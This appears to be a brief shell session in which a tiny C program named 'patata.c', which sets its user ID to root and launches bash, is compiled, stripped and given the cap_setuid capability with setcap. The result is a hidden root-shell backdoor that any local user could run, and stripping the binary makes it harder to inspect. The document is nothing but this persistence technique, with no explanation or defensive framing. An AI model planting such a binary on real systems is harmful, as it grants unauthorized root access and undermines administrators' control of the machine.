$ cat patata.c
int main() {
    setuid( 0 );
    system("bash");
}

$ gcc -o patata patata.c
$ strip patata
$ sudo setcap cap_setuid+ep patata
